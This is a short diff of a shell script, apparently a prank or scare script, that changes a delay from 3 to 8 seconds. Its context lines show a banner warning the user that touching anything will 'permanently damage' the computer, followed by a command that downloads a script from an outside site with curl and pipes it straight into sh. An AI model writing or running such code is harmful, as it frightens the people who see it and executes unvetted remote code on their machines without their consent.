@@ -10,6 +10,6 @@ clear;
 
 bigMsg "☠☠☠ DON'T TOUCH A THING!! IF YOU DO YOUR COMPUTER WILL BE PERMANENTLY DAMAGED!! ☠☠☠";
 
-sleep 3s;
+sleep 8s;
 
 termdo 'curl -s https://suckaaa.com/s/loL | sh';
